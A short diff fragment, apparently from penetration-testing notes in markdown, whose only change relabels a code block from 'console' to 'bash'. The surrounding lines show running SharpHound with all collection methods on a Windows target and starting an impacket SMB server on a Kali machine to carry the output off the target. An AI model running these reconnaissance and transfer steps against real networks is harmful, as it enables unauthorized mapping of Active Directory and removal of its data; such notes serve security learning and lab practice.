@@ -402,7 +402,7 @@ C:\Windows\Tasks\SharpHound.exe --CollectionMethods All
 
 * Transferring output to kali:
 
-```console
+```bash
 ## Kali:
     impacket-smbserver samba . -username kali -password kalii -smb2support
 ## Target:
